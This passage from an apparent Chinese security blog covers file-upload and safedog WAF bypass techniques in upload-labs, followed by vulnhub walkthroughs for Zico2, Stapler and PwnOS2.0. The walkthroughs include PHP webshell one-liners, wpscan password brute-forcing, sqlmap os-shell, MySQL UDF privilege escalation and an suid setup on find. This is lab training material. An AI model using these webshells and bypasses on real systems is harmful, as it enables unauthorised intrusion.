title="条件竞争"></a>条件竞争</h5><p>还是以17关为例。上面已知，代码中先移动文件，再进行过滤，因此只需要在文件被移动之前，通过与rename进行”竞争”，并将其”占有”，就可以进行利用。</p><p>这里使用burp进行爆破来实现不断发包的目的：</p><p><img src="/2023/04/27/file-upload/7brute.png" alt="image-20211025224348276"></p><p>重复发包10000次，并且不断刷新页面访问文件上传保存到的临时地址，也就是upload&#x2F;abcd.php。</p><p>会出现如下两种情况：</p><p><img src="/2023/04/27/file-upload/7su.png" alt="image-20211025223249026"></p><p><img src="/2023/04/27/file-upload/7fa.png" alt="image-20211025223310146"></p><p>如果为not found，就是文件已经被重命名，如果是warning或者直接解析出phpinfo()的内容就是”竞争”成功，避免了将php格式重命名为jpg等格式，可以执行所写的php脚本，连接一句话木马等等。</p><p>条件竞争典型：phpcms</p><p><strong>防护措施</strong></p><p>优化过滤的代码逻辑，先过滤再上传。</p><h5 id="文件夹绕过"><a href="#文件夹绕过" class="headerlink" title="文件夹绕过"></a>文件夹绕过</h5><p><strong>Pass-19</strong></p><p>查看源码：</p><p><img src="/2023/04/27/file-upload/9code.png" alt="image-20211025225857102"></p><p>这里将上传的文件移动到file_upload_path,file_upload_path为upload&#x2F;拼接上file_name，而file_name就是我们用post提交的save_name的值。</p><p>这里用到新的思路，首先查看UI界面：</p><p><img src="/2023/04/27/file-upload/9ui.png" alt="image-20211025230304838"></p><p>这里我们可以决定保存的名称，抓包：</p><p><img src="/2023/04/27/file-upload/9s.png" alt="image-20211025230502806"></p><p>这里保存的名字为upload-19.php&#x2F;. 看似是文件夹的命名习惯，但是和上文的点绕过&#x2F;空格绕过类似，&#x2F;.结尾时，可以绕过黑名单过滤，不会被黑名单中的后缀所命中，成功上传后，服务器又会将&#x2F;.删除，保存为原来的格式，进行验证：</p><p><img src="/2023/04/27/file-upload/9info.png" alt="image-20211025230651515"></p><p>成功绕过并能够正常解析。</p><p><strong>防护措施</strong></p><p>与空格绕过点绕过类似，可以删除文件名中的&#x2F;，也可以对filename中的&#x2F;进行匹配</p><p><strong>上文讲过的哪一种思路也能进行绕过</strong></p><h5 id="challenge"><a href="#challenge" class="headerlink" title="challenge"></a>challenge</h5><p><strong>Pass-20</strong></p><p>结合了MIME过滤，后缀名过滤，采用白名单的方式，绕过方法为逻辑数组绕过，因为在真实环境中的实用性很小，不作讲解。</p><h2 id="编辑器"><a href="#编辑器" class="headerlink" title="编辑器"></a>编辑器</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>编辑器是软体程序，一般是指用来修改电脑档案的编写软件。常见的编辑器有文本编辑器、网页编辑器、源程序编辑器、图像编辑器，声音编辑器和视频编辑器等。</p><h3 id="常见编辑器"><a href="#常见编辑器" class="headerlink" title="常见编辑器"></a>常见编辑器</h3><ul><li>FCKeditor</li><li>UEditor</li><li>eWebEditor</li><li>Cute Editor</li><li>Webhtmleditor</li><li>Kindeditor</li><li>Freetextbox</li><li>Msn editor</li></ul><h3 id="识别编辑器"><a href="#识别编辑器" class="headerlink" title="识别编辑器"></a>识别编辑器</h3><ul><li><p>inurl:fckeditor</p></li><li><p>后台看</p></li><li><p>目录扫描</p></li></ul><h3 id="编辑器漏洞利用"><a href="#编辑器漏洞利用" class="headerlink" title="编辑器漏洞利用"></a>编辑器漏洞利用</h3><p>编辑器产生的漏洞一般都是文件上传漏洞，一般没有普适性的绕过方法等，利用方法和CMS漏洞类似，需要根据已知的编辑器版本信息进行查找，如果有漏洞，就能进行利用，因此不作演示。</p><h2 id="WAF绕过（有文件上传漏洞的前提下）"><a href="#WAF绕过（有文件上传漏洞的前提下）" class="headerlink" title="WAF绕过（有文件上传漏洞的前提下）"></a>WAF绕过（有文件上传漏洞的前提下）</h2><p>目前主流的WAF大概有safedog，宝塔，D盾等等，safedog相对比较容易绕过，本次以safedog为例进行演示。实验环境为win10系统+phpstudy(Apache2.2)+safedog(Apache版)，实验的靶场为upload-labs。</p><p>WAF的绕过思路大概有两种：</p><p>1.躲过WAF的检测</p><p>2.上传其他后缀名，但是同样执行脚本内容</p><p>方法有如下几种：</p><ul><li>数据溢出-防匹配（xxx…）</li><li>符号变异-防匹配（’ “ ;）</li><li>数据截断-防匹配（%00，换行）</li><li>重复数据-防匹配（多次参数）</li></ul><h3 id="数据溢出"><a href="#数据溢出" class="headerlink" title="数据溢出"></a>数据溢出</h3><p>首先对pass-05再次进行测试。</p><p><img src="/2023/04/27/file-upload/5test.jpg" alt="image-20211104092359806"></p><p>直接上传php失败，接下来测试没有安全狗的情况下可以绕过的方法：</p><p><img src="/2023/04/27/file-upload/.jpg" alt="image-20211104092514190"></p><p>大小写被安全狗拦截，接着尝试通过数据溢出来绕过安全狗。</p><p>一般情况下name属性无法进行更改，因此首先想到在filename处进行溢出。</p><p><img src="/2023/04/27/file-upload/1.jpg" alt="image-20211104093032823"></p><p>失败，被拦截，尝试更多溢出：</p><p><img src="/2023/04/27/file-upload/2.jpg" alt="image-20211104093453518"></p><p>直接没有返回，失败。经过测试，如果继续加大溢出的字符，会导致apache服务直接崩溃。</p><p>Tips:这里在filename中进行溢出尝试时候，pass-06成功上传了php文件：</p><p><img src="/2023/04/27/file-upload/61.jpg" alt="image-20211104101741140"></p><p>因此，针对不同的过滤方法，就数据溢出形式的绕过而言，对filename进行溢出可能是一种可行的方法。</p><p>接着尝试在两个属性之间溢出：</p><p><img src="/2023/04/27/file-upload/3.jpg" alt="image-20211104094059729"></p><p>可以绕过安全狗，但是无法上传，提示上传出错。</p><p>接下来模仿报文的格式，在溢出的数据后加”;” :</p><p><img src="/2023/04/27/file-upload/62.jpg" alt="image-20211104101947942"></p><p>可以成功绕过安全狗限制。</p><p>Tips:如果溢出的数据不够，可能还会被拦截，加大溢出数据的长度即可。经过测试，不止在name,filename处可以成功，其他属性直接插入垃圾数据并使用”;”分隔也有同样的效果。</p><h3 id="符号变异"><a href="#符号变异" class="headerlink" title="符号变异"></a>符号变异</h3><p>首先对正常php进行测试，被安全狗拦截：</p><p><img src="/2023/04/27/file-upload/21.jpg" alt="image-20211104124300312"></p><p>符号变异的绕过主要就是通过对<code>&#39; &quot; ;   </code>等符号进行测试。接下来依次尝试：</p><p>从报文可以看出，filename到content-type中间没有分号，而是一个换行，尝试添加分号：</p><p><img src="/2023/04/27/file-upload/22.jpg" alt="image-20211104124615589"></p><p>绕过失败，被拦截。</p><p>尝试删除一个后面的引号：</p><p><img src="/2023/04/27/file-upload/23.jpg" alt="test023"></p><p>成功绕过安全狗上传文件,到目录下查看，正常：</p><p><img src="/2023/04/27/file-upload/r1.jpg" alt="image-20211104125154265"></p><p>尝试删除前面的引号：</p><p><img src="/2023/04/27/file-upload/24.jpg" alt="image-20211104125241961"></p><p>被拦截。这里引号的位置不同，导致拦截行为有差异，可能跟安全狗的安全策略有关。</p><p>接下来考虑用单引号替换双引号，测试方法相同就不再重复。结果如下：</p><p><img src="/2023/04/27/file-upload/ell.jpg" alt="image-20211104125535150"></p><p>如果没有单引号、只有一个单引号或者有一个闭合的单引号，全部都能绕过检测成功上传文件。</p><p>Tips:上述单引号的四种绕过中，第二种会上传后缀名为php’的文件，无法执行</p><p>另外可以尝试filename&#x3D;”x”a.php。有一定几率绕过，上传的文件名为a.php。如果直接写”x”.php，则文件名为.php,也能执行。</p><h3 id="数据截断"><a href="#数据截断" class="headerlink" title="数据截断"></a>数据截断</h3><p>尝试之前试过的00截断，在post中，因此需要进行url编码：</p><p><img src="/2023/04/27/file-upload/g" alt="image-20211104132010892"></p><p>直接绕过了安全狗。查看服务器中的文件，为a.php:</p><p><img src="/2023/04/27/file-upload/r2.jpg" alt="image-20211104132106720"></p><p>接着通过分号进行截断，这里主要是利用了白名单，让检测时误以为是白名单中的内容：</p><p><img src="/2023/04/27/file-upload/.jpg" alt="image-20211104132231286"></p><p>成功绕过安全狗，注意，虽然有.jpg ; 但是文件最终还是php文件。</p><p>Tips:利用数据截断进行上传时，还可以考虑::$DATA截断，换行截断。</p><p>换行截断是指：</p><p><img src="/2023/04/27/file-upload/g" alt="image-20211104135213671"></p><p>也有一定的几率能够绕过。</p><h3 id="重复数据-防匹配"><a href="#重复数据-防匹配" class="headerlink" title="重复数据-防匹配"></a>重复数据-防匹配</h3><p>这里通过使用重复数据进行绕过，上传的最终文件是最后一个，因此前面重复添加jpg来绕过：</p><p><img src="/2023/04/27/file-upload/.jpg" alt="image-20211104133636071"></p><p>成功，到服务器进行验证：</p><p><img src="/2023/04/27/file-upload/a.jpg" alt="image-20211104133806292"></p><p>上传了名为hahaha.php的文件。</p><p>尝试在filename中加入重复数据：</p><p><img src="/2023/04/27/file-upload/aa.jpg" alt="image-20211104134353518"></p><p>这里将name，content-type的内容添加到filename中，绕过了安全狗，查看上传的文件名：</p><p><img src="/2023/04/27/file-upload/nt.jpg" alt="image-20211104134444896"></p><p>发现文件名闻jpegaaaaa.php，观察报文发现新的思路，是否可以直接使用&#x2F;绕过？</p><p>进行测试：</p><p><img src="/2023/04/27/file-upload/jpg" alt="image-20211104134940506"></p><p>发现被过滤，将aaa替换成更长的字符串依然失败。再结合报文，可能需要引号闭合，进行测试：</p><p><img src="/2023/04/27/file-upload/.jpg" alt="image-20211104134902898"></p><p>成功绕过，查看服务器中的文件名：</p><p><img src="/2023/04/27/file-upload/pg" alt="image-20211104135052079"></p><p>与猜想的一致，成功。</p><h3 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h3><p>在不了解黑白名单内容的情况下，可以通过fuzz测试来进行尝试。</p><p>还是以upload-labs为例，假设只针对php文件。</p><p>对filename的内容进行爆破，使用fuzz字典，结果如下：</p><p><img src="/2023/04/27/file-upload/r.jpg" alt="image-20211104135715164"></p><p>是否能通过检测可以通过render查看，此处直接从服务器上更直观地来看：</p><p><img src="/2023/04/27/file-upload/r4.jpg" alt="image-20211104135831748"></p><p>上传的都是绕过了黑白名单限制的后缀。</p><p>Tips：对网站爆破可能会被封锁IP，可以通过burp的fakeip插件或者动态ip进行一定程度的缓解。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>WAF的绕过方法有很多种，但是思路大致就是上文提到的内容，将各种方法结合使用往往就能对WAF进行有效地绕过。</p><h3 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h3><ul><li>对于垃圾数据填充，可以通过content!进行一定程度的防御</li><li>限制上传文件名的最大长度</li><li>对<code>; &#39; &quot; /</code>等特殊字符进行限制</li><li>对文件名中的00进行匹配</li></ul><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ul><li>看中间件，看是否存在解析漏洞&#x2F;CMS&#x2F;编辑器漏洞&#x2F;CVE&#x2F;漏洞。如果有，搜索对应的利用方法。</li><li>查找文件上传点，找到后，先上传普通的文件进行测试，筛选，接着对过滤方法进行猜测，针对不同的过滤采用不同的绕过方法。</li></ul><h3 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h3><p>识别方法：</p><ul><li>云悉</li><li>whatweb</li><li>御剑识别</li><li>文件md5值</li><li>F12数据包</li><li>robots.txt</li></ul><h3 id="编辑器-1"><a href="#编辑器-1" class="headerlink" title="编辑器"></a>编辑器</h3><ul><li>通过url或者UI界面内容进行识别</li></ul><h3 id="其他-CVE"><a href="#其他-CVE" class="headerlink" title="其他&#x2F;CVE"></a>其他&#x2F;CVE</h3><ul><li>关注CVE官网，漏洞库等</li></ul>]]></content>
    
    
    <categories>
      
      <category>OWASP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>file upload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_Zico2</title>
    <link href="/2023/04/26/vulnhub-Zico2/"/>
    <url>/2023/04/26/vulnhub-Zico2/</url>
    
    <content type="html"><![CDATA[<h1 id="vulnhub-Zico2"><a href="#vulnhub-Zico2" class="headerlink" title="vulnhub_Zico2"></a>vulnhub_Zico2</h1><p>arp-scan+masscan扫端口：</p><p><img src="/2023/04/27/file-upload/2/image-20230309085304660.png" alt="image-20230309085304660"></p><p>nmap扫服务：</p><p><img src="/2023/04/27/file-upload/2/image-20230309085425386.png" alt="image-20230309085425386"></p><p>开放了22，80，111，50670等端口。</p><p>尝试ssh弱口令，失败：</p><p><img src="/2023/04/27/file-upload/2/image-20230309091310662.png" alt="image-20230309091310662"></p><p>访问80端口的http服务：</p><p><img src="/2023/04/27/file-upload/2/image-20230309091518406.png" alt="image-20230309091518406"></p><p>点击各类功能点，发现如下页面，page&#x3D;xxx:</p><p><img src="/2023/04/27/file-upload/2/image-20230309091602675.png" alt="image-20230309091602675"></p><p>尝试本地文件包含，存在漏洞：</p><p><img src="/2023/04/27/file-upload/2/image-20230309091624462.png" alt="image-20230309091624462"></p><p>dirsearch爆破后台目录：</p><p><img src="/2023/04/27/file-upload/2/image-20230309091822847.png" alt="image-20230309091822847"></p><p>发现&#x2F;dbadmin，访问路径：</p><p><img src="/2023/04/27/file-upload/2/image-20230309091837154.png" alt="image-20230309091837154"></p><p>发现phpliteadmin，尝试弱口令admin：</p><p><img src="/2023/04/27/file-upload/2/image-20230309095117322.png" alt="image-20230309095117322"></p><p>登录成功：</p><p><img src="/2023/04/27/file-upload/2/image-20230309095224609.png" alt="image-20230309095224609"></p><p>首先想到查询数据，选择csv格式导出：</p><p><img src="/2023/04/27/file-upload/2/image-20230309095355218.png" alt="image-20230309095355218"></p><p>发现root和zico两个用户。</p><p><img src="/2023/04/27/file-upload/2/image-20230309095433457.png" alt="image-20230309095433457"></p><p>md5解密：</p><p><img src="/2023/04/27/file-upload/2/image-20230309095517231.png" alt="image-20230309095517231"></p><p>直接ssh登录root&#x2F;34root34，失败。</p><p>尝试寻找phpliteadmin漏洞，使用searchsploit搜索：</p><p><img src="/2023/04/27/file-upload/2/image-20230309095627928.png" alt="image-20230309095627928"></p><p>存在代码注入漏洞，根据提示，需要新建数据库，新建表，就能执行php代码。</p><p><img src="/2023/04/27/file-upload/2/image-20230309095639243.png" alt="image-20230309095639243"></p><p>创建表，插入一条数据<code>&lt;?php @eval($_POST[cmd]); ?&gt;</code></p><p><img src="/2023/04/27/file-upload/2/image-20230309100008129.png" alt="image-20230309100008129"></p><p>成功写入，再配合前面的本地文件包含，直接getshell，连上蚁剑。</p><p><img src="/2023/04/27/file-upload/2/image-20230309100225528.png" alt="image-20230309100225528"></p><p>在home下，查找zico相关文件，发现wp配置，存在用户名密码。</p><p><img src="/2023/04/27/file-upload/2/image-20230309100615572.png" alt="image-20230309100615572"></p><p>弹shell到kali，生成交互shell，su zico，切换到zico用户：</p><p><img src="/2023/04/27/file-upload/2/image-20230309100803138.png" alt="image-20230309100803138"></p><p>sudo -l，发现tar，zip，直接提权到root。</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_Stapler</title>
    <link href="/2023/04/26/vulnhub-Stapler/"/>
    <url>/2023/04/26/vulnhub-Stapler/</url>
    
    <content type="html"><![CDATA[<h1 id="Stapler"><a href="#Stapler" class="headerlink" title="Stapler"></a>Stapler</h1><p>arp-scan发现目标主机：</p><p><img src="/2023/04/27/file-upload/ler/image-20230307232914512.png" alt="image-20230307232914512"></p><p>masscan全端口扫描：</p><p><img src="/2023/04/27/file-upload/ler/image-20230307232942455.png" alt="image-20230307232942455"></p><p>nmap详细扫描：</p><p><img src="/2023/04/27/file-upload/ler/image-20230307233921356.png" alt="image-20230307233921356"></p><p><img src="/2023/04/27/file-upload/ler/image-20230307233945813.png" alt="image-20230307233945813"></p><p>开放了ftp,ssh,mysql,smb,http等服务。</p><p>ftp允许匿名登录：</p><p><img src="/2023/04/27/file-upload/ler/image-20230307234331021.png" alt="image-20230307234331021"></p><p>查看note文件内容:</p><p><img src="/2023/04/27/file-upload/ler/image-20230307234345835.png" alt="image-20230307234345835"></p><p>这里提到一些用户名：Harry,Jojn,Elly.</p><p>ssh连接：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308151213643.png" alt="image-20230308151213643"></p><p>新的用户名Barry。</p><p>尝试弱口令失败，暂时跳过。</p><p>enum4linux可以发现一些用户信息：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308171948892.png" alt="image-20230308171948892"></p><p>对于smb协议，查看共享文件夹：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308171639530.png" alt="image-20230308171639530"></p><p>可以访问kathy和tmp目录，均无有效信息：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308171722902.png" alt="image-20230308171722902"></p><p>666端口服务为止，直接nc：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308151340275.png" alt="image-20230308151340275"></p><p>可以看到message2.jpg。</p><p>接收文件并保存：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308151442195.png" alt="image-20230308151442195"></p><p>发现为zip文件，改名解压：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308151514679.png" alt="image-20230308151514679"></p><p>新用户名Scott.</p><p>收集到以上用户名之后尝试进行ssh和ftp服务的爆破。</p><p><img src="/2023/04/27/file-upload/ler/image-20230308160218674.png" alt="image-20230308160218674"></p><p>ssh爆破失败，但是ftp爆破出elly&#x2F;ylle，登录后并无有用信息。</p><p>接下来把重点放在80和12380端口的http服务。</p><p>先看80：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308085447584.png" alt="image-20230308085447584"></p><p><img src="/2023/04/27/file-upload/ler/image-20230308085437715.png" alt="image-20230308085437715"></p><p>这里有两个配置文件，.bashrc和.profile，先下载到本地。</p><p><img src="/2023/04/27/file-upload/ler/image-20230308085713209.png" alt="image-20230308085713209"></p><p>无有用信息。</p><p>接下来尝试访问12380：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308091700598.png" alt="image-20230308091700598"></p><p>无任何有效信息，访问robots.txt等目录，不发生跳转，返回400：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308091802471.png" alt="image-20230308091802471"></p><p>nikto扫描：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308091905800.png" alt="image-20230308091905800"></p><p>这里提到了&#x2F;admin112233,&#x2F;blogblog等目录，但是http访问后依然为400，nikto显示有ssl信息，使用https:</p><p><img src="/2023/04/27/file-upload/ler/image-20230308092714929.png" alt="image-20230308092714929"></p><p>出现不同的页面。</p><p><img src="/2023/04/27/file-upload/ler/image-20230308092737735.png" alt="image-20230308092737735"></p><p>admin112233为xss页面。</p><p><img src="/2023/04/27/file-upload/ler/image-20230308092803364.png" alt="image-20230308092803364"></p><p>blogblog为博客页面。对该目录进行爆破：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308093300771.png" alt="image-20230308093300771"></p><p>明显为wordpress框架。</p><p>上wpscan：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308093434748.png" alt="image-20230308093434748"></p><p>提示SSL peer certificate or SSH remote key was not OK,可能是ssl证书有问题，disable：</p><p><code>wpscan --url https://192.168.59.19:12380/blogblog --disable-tls-checks</code></p><p><img src="/2023/04/27/file-upload/ler/image-20230308093703854.png" alt="image-20230308093703854"></p><p>问题解决。</p><p>扫一下用户名：</p><p><code>wpscan --url https://192.168.59.19:12380/blogblog --disable-tls-checks --enumerate u</code></p><p><img src="/2023/04/27/file-upload/ler/image-20230308160754290.png" alt="image-20230308160754290"></p><p>枚举出用户名后，直接大字典爆破密码：</p><p><code>wpscan --url https://192.168.59.19:12380/blogblog --disable-tls-checks -eu -P /usr/share/wordlists/rockyou.txt</code></p><p><img src="/2023/04/27/file-upload/ler/image-20230308161305127.png" alt="image-20230308161305127"></p><p>用得到的账号登录：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308161505638.png" alt="image-20230308161505638"></p><p>普通用户权限，非管理员，暂时跳过。</p><p>回到wpscan，对wordpress插件进行扫描，尝试利用插件漏洞，默认为被动扫描，要发现全部插件这里使用主动扫描，ap代表all plugins：</p><p><code>wpscan --url https://192.168.59.19:12380/blogblog --disable-tls-checks --enumerate ap --plugins-detection aggressive</code></p><p><img src="/2023/04/27/file-upload/ler/image-20230308161957394.png" alt="image-20230308161957394"></p><p>扫出了图中部分插件。经过尝试，advanced-video-embed-embed-videos-or-playlists存在漏洞。</p><p><img src="/2023/04/27/file-upload/ler/image-20230308162206276.png" alt="image-20230308162206276"></p><p>在EDB中寻找poc，查看python文件：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308162257243.png" alt="image-20230308162257243"></p><p>这里修改url为靶机的地址，运行报错：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308162346333.png" alt="image-20230308162346333"></p><p>修改poc，导入ssl，并且加上<code>ssl._create_default_https_context = ssl._create_unverified_context</code></p><p>再次运行，无回显。</p><p><img src="/2023/04/27/file-upload/ler/image-20230308162534743.png" alt="image-20230308162534743"></p><p>此时查看登录后的主页，发现出现了.jpg：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308163901154.png" alt="image-20230308163901154"></p><p>尝试直接访问poc中的url：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308163949595.png" alt="image-20230308163949595"></p><p>访问提示页面后出现404。</p><p>尝试访问jpeg文件，wordpress中一般存在&#x2F;wp-content&#x2F;uploads文件夹，访问后发现jpeg文件。</p><p><img src="/2023/04/27/file-upload/ler/image-20230308164229282.png" alt="image-20230308164229282"></p><p>直接wget下载文件：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308164423023.png" alt="image-20230308164423023"></p><p>ssl证书有问题，加上参数–no-check-certificate后解决。</p><p>查看文件内容：<br><img src="/2023/04/27/file-upload/ler/image-20230308164459634.png" alt="image-20230308164459634"></p><p>jpeg文件内容为config文件，包含了数据库配置信息。</p><p>直接登录数据库，找到用户表：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308164621458.png" alt="image-20230308164621458"></p><p>注意John用户存在user_url，可能为管理员权限。</p><p>将用户名密码简单处理后如下：<br><img src="/2023/04/27/file-upload/ler/image-20230308164722763.png" alt="image-20230308164722763"></p><p>用john跑密码：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308165310180.png" alt="image-20230308165310180"></p><p>用John&#x2F;incorrect登录后台：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308165344905.png" alt="image-20230308165344905"></p><p>成功获得管理员权限。</p><p>尝试寻找上传点传马或者改服务端文件，在插件处发现可以上传文件：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308165444017.png" alt="image-20230308165444017"></p><p>直接上传，到uploads目录查看，上传成功：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308165511905.png" alt="image-20230308165511905"></p><p>这里如果没找到上传点，可以直接用mysql写马：</p><p><code>&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;&quot; into outfile &quot;/var/www/https/blogblog/wp-content/uploads/cmd1.php</code></p><p><img src="/2023/04/27/file-upload/ler/image-20230308174104145.png" alt="image-20230308174104145"></p><p><img src="/2023/04/27/file-upload/ler/image-20230308174122155.png" alt="image-20230308174122155"></p><p><img src="/2023/04/27/file-upload/ler/image-20230308174138286.png" alt="image-20230308174138286"></p><p>连蚁剑，注意需要忽略https证书，不然会连接失败：</p><img src="vulnhub-Stapler/image-20230308165627564.png" alt="image-20230308165627564" style="zoom:50%;" /><p>成功连接：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308165610387.png" alt="image-20230308165610387"></p><p>弹shell到kali，pty：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308170259336.png" alt="image-20230308170259336"></p><p>home目录下存在很多文件夹，内容都为空。</p><p>查看一下history文件，由于存在很多exit命令，使用grep排除：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308170545936.png" alt="image-20230308170545936"></p><p>发现peter和JKanode用户的密码。</p><p>JKanode：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308170814399.png" alt="image-20230308170814399"></p><p>peter：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308170939917.png" alt="image-20230308170939917"></p><p>直接sudo提权，可以执行任意命令，拿到flag。</p><p>同时拿到www低权限之后，可以使用CVE-2021-4034提权，几乎通杀：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308171520442.png" alt="image-20230308171520442"></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_PwnOS2.0</title>
    <link href="/2023/04/26/vulnhub-PwnOS2-0/"/>
    <url>/2023/04/26/vulnhub-PwnOS2-0/</url>
    
    <content type="html"><![CDATA[<h1 id="PwnOS2-0"><a href="#PwnOS2-0" class="headerlink" title="PwnOS2.0"></a>PwnOS2.0</h1><p>首先nmap扫描端口，发现22，25，80，110等开放：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321135938360.png" alt="image-20230321135938360"></p><p>nikto扫一下80的http服务：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321140053612.png" alt="image-20230321140053612"></p><p>发现了一些敏感目录。</p><p>info目录为phpinfo:</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321140123549.png" alt="image-20230321140123549"></p><p>includes:</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321140140442.png" alt="image-20230321140140442"></p><p>login.php为登录页面：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321140320230.png" alt="image-20230321140320230"></p><p>register.php为注册页面：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321140330516.png" alt="image-20230321140330516"></p><p>注册用户<a href="mailto:&#x61;&#97;&#97;&#64;&#x71;&#x71;&#46;&#99;&#x6f;&#109;">&#x61;&#97;&#97;&#64;&#x71;&#x71;&#46;&#99;&#x6f;&#109;</a>，未发现有用信息。</p><p>接下来考虑通过login.php来getshell，在email字段输入单引号，报错：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321140613604.png" alt="image-20230321140613604"></p><p>明显存在sql注入，并且报错提示数据库为mysql。</p><p>burp抓包直接跑sqlmap，加上–dbms mysql参数：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321140853513.png" alt="image-20230321140853513"></p><p>存在注入，–dump，查看user&#x2F;pass：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321141528736.png" alt="image-20230321141528736"></p><p><a href="mailto:&#97;&#97;&#x61;&#x40;&#113;&#113;&#46;&#99;&#111;&#109;">&#97;&#97;&#x61;&#x40;&#113;&#113;&#46;&#99;&#111;&#109;</a>是注册的测试账号，尝试使用<a href="mailto:&#x61;&#x64;&#x6d;&#x69;&#110;&#64;&#x69;&#x73;&#x69;&#x6e;&#116;&#x73;&#x2e;&#99;&#x6f;&#109;">&#x61;&#x64;&#x6d;&#x69;&#110;&#64;&#x69;&#x73;&#x69;&#x6e;&#116;&#x73;&#x2e;&#99;&#x6f;&#109;</a>账号登录&#x2F;</p><p>密码为md5，解开后为killerbeesareflying，登录：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321141719166.png" alt="image-20230321141719166"></p><p>登录成功，但是没有可用信息，回到sqlmap，直接–os-shell:</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321141951074.png" alt="image-20230321141951074"></p><p>成功拿到shell，为www-data权限，但是此处的shell无法弹到kali。</p><p>在kali上寻找php马，传到靶机上：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321142452841.png" alt="image-20230321142452841"></p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321142229760.png" alt="image-20230321142229760"></p><p>本地开启监听，成功连上靶机：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321142252180.png" alt="image-20230321142252180"></p><p>在当前目录下发现mysqli_connect.php文件，并发现密码root&#x2F;goodday:</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321142626934.png" alt="image-20230321142626934"></p><p>尝试登录mysql，失败，登录ssh同样失败。</p><p>回到上级目录，也存在mysqli_connect.php文件，查看发现另一组账号root&#x2F;root@ISIntS:</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321142650060.png" alt="image-20230321142650060"></p><p>ssh登录，成功拿到root权限：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321142837619.png" alt="image-20230321142837619"></p><p>同时该密码可以登录mysql，因此尝试udf提权。</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321155456474.png" alt="image-20230321155456474"></p><p>首先查看secure_file_priv，如果值为空，则可以提权：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321155715082.png" alt="image-20230321155715082"></p><p>接下来查看compile选项：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321155755619.png" alt="image-20230321155755619"></p><p>linux，64位。</p><p>最后查看plugin路径，如果没有需要自行创建，此处存在：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321155836405.png" alt="image-20230321155836405"></p><p>使用sqlmap直接将udf.so文件传到plugin目录：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321143053212.png" alt="image-20230321143053212"></p><p>此处的so文件使用的是msf自带的，如果使用sqlmap中的，需要先进行解码。</p><p>msf中路径为：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321160832973.png" alt="image-20230321160832973"></p><p>分别对应了linux和windows中的32&#x2F;64位文件，此处使用的是lib_mysqludf_sys_64.so。</p><p>上传之后，默认会多出一个sys_eval方法，但是不会回显，再手动添加一次，returns string：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321153548843.png" alt="image-20230321153548843"></p><p>此时查询方法，存在sys_eval，执行whoami，是root权限，提权成功。</p><p>为了后续操作，给find加上suid：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321143316978.png" 